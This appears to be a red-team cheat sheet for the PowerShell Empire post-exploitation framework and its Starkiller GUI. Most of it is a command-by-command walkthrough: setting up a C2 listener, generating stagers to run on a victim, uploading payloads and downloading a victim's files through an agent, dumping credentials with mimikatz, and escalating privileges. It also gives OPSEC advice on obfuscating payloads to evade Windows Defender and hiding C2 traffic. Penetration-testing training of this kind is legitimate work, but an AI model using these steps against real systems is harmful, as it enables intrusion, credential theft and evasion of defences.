
> [!abstract] PowerShell Empire & Starkiller Cheat Sheet
> PowerShell Empire is a pure PowerShell post-exploitation framework designed for stealth and persistence. Starkiller is its graphical frontend. This guide covers the installation, CLI usage, and GUI workflow.
> **MITRE ATT&CK Mapping:** [TA0011 Command and Control](https://attack.mitre.org/tactics/TA0011/) | [TA0002 Execution](https://attack.mitre.org/tactics/TA0002/)

## Installation & Initial Setup

> [!info]+ Installing Empire & Starkiller
> ```bash
> # Update repositories and install both packages
> sudo apt update && sudo apt install powershell-empire starkiller -y
> ```
> 
> **Starting the Server (Terminal 1):**
> ```bash
> sudo powershell-empire server
> # Wait until you see the "Server >" prompt
> ```
> 
> **Starting the CLI Client (Terminal 2):**
> ```bash
> sudo powershell-empire client
> # Wait until you see the "(Empire) >" prompt
> ```
> 
> **Accessing Starkiller (GUI):**
> 1. Open Starkiller from the start menu or run `starkiller` in the terminal.
> 2. Login with default credentials:
>    - **User:** `empireadmin`
>    - **Pass:** `password123`

---

## Empire CLI Workflow

> [!tip]+ 1. Listeners (Setting up the C2)
> Listeners wait for incoming connections from compromised hosts (agents).
> ```text
> (Empire) > listeners
> (Empire) > uselistener http
> (Empire: uselistener/http) > info
> (Empire: uselistener/http) > set Port 80
> (Empire: uselistener/http) > execute
> 
> [*] Listener successfully started!
> ```

> [!example]+ 2. Stagers (Generating the Payload)
> Stagers are the initial payloads executed on the victim to establish a connection back to the listener.
> ```text
> (Empire) > usestager windows_launcher_bat
> (Empire: usestager/windows_launcher_bat) > info
> (Empire: usestager/windows_launcher_bat) > set Listener http
> (Empire: usestager/windows_launcher_bat) > execute
> 
> [*] Stager saved to /tmp/launcher.bat
> ```
> *Other useful stagers: `windows_dll`, `windows_psh`, `multi_macro`.*

> [!danger]+ 3. Agents (Interacting with Victims)
> Once the stager runs on the victim, an Agent checks in.
> ```text
> (Empire) > agents
> 
> [*] Agent X7B2K9 checked in!
> 
> (Empire) > interact X7B2K9
> (Empire: X7B2K9) > sysinfo
> (Empire: X7B2K9) > shell whoami
> (Empire: X7B2K9) > shell ipconfig
> (Empire: X7B2K9) > upload /tmp/payload.exe C:\\Users\\Public\\payload.exe
> (Empire: X7B2K9) > download C:\\Users\\victim\\secret.txt
> ```

> [!bug]+ 4. Modules (Post-Exploitation)
> Empire comes with built-in modules for privilege escalation, lateral movement, and persistence.
> ```text
> (Empire: X7B2K9) > usemodule credentials/mimikatz/logonpasswords
> (Empire: credentials/mimikatz/logonpasswords) > execute
> 
> (Empire: X7B2K9) > usemodule powershell/privesc/getsystem
> (Empire: powershell/privesc/getsystem) > execute
> ```
> **Note:** To search for modules directly from the main menu:
> ```text
> (Empire) > searchmodule mimikatz
> ```

---

## Starkiller (GUI) Workflow

> [!success]+ Using the Graphical Interface
> Starkiller makes Empire much easier to manage, especially for reporting and visualizing agent graphs.
> 
> **1. Listeners Tab:**
> - Click **Create**.
> - Select `http` (or `https`).
> - Configure the Port and Host IP.
> - Click **Submit** to start the listener.
> 
> **2. Stagers Tab:**
> - Click **Create**.
> - Select a stager type (e.g., `windows_psh` for a PowerShell one-liner).
> - Select the Listener you just created.
> - Click **Submit**. You can now copy the generated PowerShell command and run it on the victim.
> 
> **3. Agents Tab:**
> - View all checked-in agents here.
> - Click on an agent to view `sysinfo`, `agents.json` config, and execution history.
> - Use the **Interact** button to open a dedicated terminal window for that specific agent.
> 
> **4. Modules Tab:**
> - Browse the module tree (e.g., `Credentials` -> `Mimikatz`).
> - Select the agent you want to run it on from the dropdown.
> - Click **Submit** to execute the module on the target.

---

> [!warning] OPSEC (Operational Security) Notes
> - **Event Logs:** Empire heavily relies on PowerShell, which generates massive amounts of Windows Event Log entries (ID 4104 - Script Block Logging).
> - **AV/EDR Evasion:** Default Empire stagers are easily caught by modern Windows Defender. You may need to obfuscate the payload manually or use the `starkiller` integrations with tools like `Invoke-Obfuscation` before delivery.
> - **HTTP Profile:** Consider using custom HTTP profiles or Malleable C2 (if using Empire 4.x+) to blend C2 traffic with normal web traffic.

